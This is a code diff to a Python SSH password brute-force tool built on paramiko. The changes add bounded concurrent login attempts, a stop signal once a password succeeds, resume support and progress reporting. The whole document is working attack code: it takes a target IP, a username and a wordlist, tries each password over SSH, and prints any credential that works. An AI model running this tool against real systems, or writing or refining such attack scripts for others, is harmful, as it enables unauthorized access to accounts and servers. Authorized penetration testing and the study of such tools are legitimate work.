@@ -1,10 +1,14 @@
-import paramiko
-import sys
-import os
 import argparse
-import time
-from concurrent.futures import ThreadPoolExecutor
 import datetime
+import itertools
+import os
+import sys
+import threading
+import time
+from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
+
+import paramiko
+
 
 def parse_args():
     """Parse command line arguments."""
@@ -36,17 +40,23 @@ def ssh_connect(target, port, username, password, timeout=5, code=0):
         code = 3
     finally:
         ssh.close()
-    
+
     return code
 
-def attempt_login(target, port, username, password, verbose, timeout, delay=0):
+def attempt_login(target, port, username, password, verbose, timeout, delay=0, stop_event=None):
     """Attempt to login with provided credentials and handle the output."""
+    if stop_event is not None and stop_event.is_set():
+        return None, -1, password
+
     if delay > 0:
         time.sleep(delay)
-        
+
+    if stop_event is not None and stop_event.is_set():
+        return None, -1, password
+
     response = ssh_connect(target, port, username, password, timeout)
     result = None
-    
+
     if response == 0:
         result = f"[+] SUCCESS: Password found: {password}"
     elif response == 1:
@@ -56,7 +66,7 @@ def attempt_login(target, port, username, password, verbose, timeout, delay=0):
         result = f"[!] ERROR: SSH connection error - {password}"
     elif response == 3:
         result = f"[!] ERROR: Connection error - {password}"
-    
+
     return result, response, password
 
 def save_progress(output_file, password, success=False):
@@ -72,106 +82,125 @@ def handle_interrupt(passwords_tried, current_password, output_file=None):
     """Handle keyboard interrupt gracefully."""
     print(f"\n\n[*] Exiting after trying {passwords_tried} passwords")
     print(f"[*] Last password attempted: {current_password}")
-    
+
     if output_file:
         save_progress(output_file, current_password)
-    
+
     print("[*] You can resume later using --resume option")
     sys.exit(1)
 
 def main():
     """Main function to execute the brute force attack."""
     args = parse_args()
-    
+
     # Interactively get parameters if not provided via command line
     target = args.target if args.target else input('Please enter target IP address: ')
     username = args.username if args.username else input('Please enter username to bruteforce: ')
     password_file = args.password_file if args.password_file else input('Please enter location of the password file: ')
-    
+
     # Validate input file
     if not os.path.isfile(password_file):
         print(f"[!] Error: Password file '{password_file}' not found")
         sys.exit(1)
-    
-    # Count total passwords for progress reporting
+
+    # Count non-blank passwords for progress reporting
     try:
-        total_passwords = sum(1 for _ in open(password_file, 'r', errors='ignore'))
+        total_passwords = sum(1 for line in open(password_file, errors='ignore') if line.strip())
     except UnicodeDecodeError:
         # Fallback to binary mode if UTF-8 decoding fails
-        total_passwords = sum(1 for _ in open(password_file, 'rb'))
+        total_passwords = sum(1 for line in open(password_file, 'rb') if line.strip())
     print(f"[*] Loaded {total_passwords} passwords from {password_file}")
-    
+
     # Set up output file if specified
     output_file = args.output
     if output_file:
         with open(output_file, 'a') as f:
             timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             f.write(f"[{timestamp}] Starting brute force on {username}@{target}:{args.port}\n")
-    
+
     # Set up resume functionality
     start_line = 0
     if args.resume and args.resume.isdigit():
         start_line = int(args.resume)
         print(f"[*] Resuming from line {start_line}")
-    
-    passwords_tried = 0
+
+    passwords_tried = start_line
     current_password = ""
-    
+    stop_event = threading.Event()
+
+    def submit(executor, password):
+        return executor.submit(
+            attempt_login,
+            target,
+            args.port,
+            username,
+            password,
+            args.verbose,
+            args.timeout,
+            args.delay,
+            stop_event
+        )
+
     try:
-        with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            with open(password_file, 'r', errors='ignore') as file:
-                futures = []
-                
-                # Skip to resume point if specified
-                if start_line > 0:
-                    for _ in range(start_line):
-                        next(file, None)
-                
-                # Submit tasks for password attempts
-                for i, line in enumerate(file):
-                    password = line.strip()
-                    if password:
+        with open(password_file, errors='ignore') as file:
+            # Skip to resume point if specified
+            for _ in range(start_line):
+                next(file, None)
+
+            passwords = (line.strip() for line in file if line.strip())
+
+            with ThreadPoolExecutor(max_workers=args.threads) as executor:
+                # Keep a bounded number of attempts in flight instead of queueing the whole file
+                pending = {submit(executor, pw): pw for pw in itertools.islice(passwords, args.threads * 2)}
+                found_password = None
+
+                while pending and found_password is None:
+                    done, _ = wait(pending, return_when=FIRST_COMPLETED)
+
+                    for future in done:
+                        pending.pop(future)
+                        result, response, password = future.result()
+
+                        if response == -1:
+                            continue
+
+                        passwords_tried += 1
                         current_password = password
-                        future = executor.submit(
-                            attempt_login, 
-                            target, 
-                            args.port, 
-                            username, 
-                            password, 
-                            args.verbose, 
-                            args.timeout,
-                            args.delay
-                        )
-                        futures.append(future)
-                        passwords_tried = i + 1 + start_line
-                        
-                        # Print progress periodically
+
+                        if result and (args.verbose or response == 0):
+                            print(f"\r{result}")
+
                         if passwords_tried % 10 == 0:
                             percent = (passwords_tried / total_passwords) * 100
                             print(f"\r[*] Progress: {passwords_tried}/{total_passwords} ({percent:.2f}%)", end="")
-                
-                # Process results
-                for future in futures:
-                    result, response, password = future.result()
-                    
-                    if result and (args.verbose or response == 0):
-                        print(f"\r{result}")
-                    
-                    # Handle successful login
-                    if response == 0:
-                        print(f"\n[+] Authentication successful!")
-                        print(f"[+] Target: {username}@{target}:{args.port}")
-                        print(f"[+] Password: {password}")
-                        
-                        if output_file:
-                            save_progress(output_file, password, success=True)
-                        
-                        return True
-                
+
+                        if response == 0:
+                            found_password = password
+                            break
+
+                        next_password = next(passwords, None)
+                        if next_password is not None:
+                            pending[submit(executor, next_password)] = next_password
+
+                if found_password is not None:
+                    # Signal in-flight attempts to short-circuit and cancel the queued ones
+                    stop_event.set()
+                    for future in pending:
+                        future.cancel()
+
+                    print("\n[+] Authentication successful!")
+                    print(f"[+] Target: {username}@{target}:{args.port}")
+                    print(f"[+] Password: {found_password}")
+
+                    if output_file:
+                        save_progress(output_file, found_password, success=True)
+
+                    return True
+
         print(f"\n[-] Exhausted password list ({passwords_tried} passwords)")
         print("[-] No valid password found")
         return False
-                    
+
     except KeyboardInterrupt:
         handle_interrupt(passwords_tried, current_password, output_file)
 
